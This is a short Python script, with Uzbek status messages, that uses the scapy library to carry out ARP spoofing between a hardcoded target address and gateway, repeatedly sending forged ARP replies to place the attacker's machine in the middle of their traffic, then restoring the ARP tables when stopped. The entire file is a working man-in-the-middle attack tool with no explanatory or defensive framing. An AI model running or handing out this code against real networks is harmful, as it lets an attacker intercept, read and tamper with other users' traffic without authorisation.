import scapy.all as scapy
import time
start_time=time.time()
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_brodcast = brodcast/arp_request
    answer_list = scapy.srp(arp_request_brodcast,timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)        
    scapy.send(packet,verbose=False)
def restore(destinition_ip,source_ip):
    destinition_mac=get_mac(destinition_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destinition_ip, hwdst=destinition_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
target_ip = "172.20.2.21"
getwey_ip = "172.20.1.1"
try:
    send_packet_count = 0
    print("spoof boshlandi")
    while True:
        spoof(target_ip,getwey_ip)
        spoof(getwey_ip,target_ip)
        send_packet_count = send_packet_count+2
        print(f"\r{send_packet_count} ta paket yuboruldi")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip,getwey_ip)
    restore(getwey_ip,target_ip)
    end_time=time.time()
    work_time=(end_time-start_time)%60
    print(f"Dastur tugadi...\nyuborilgan paketlar soni {send_packet_count}\nishlash vaqti {int(work_time)} soniya")
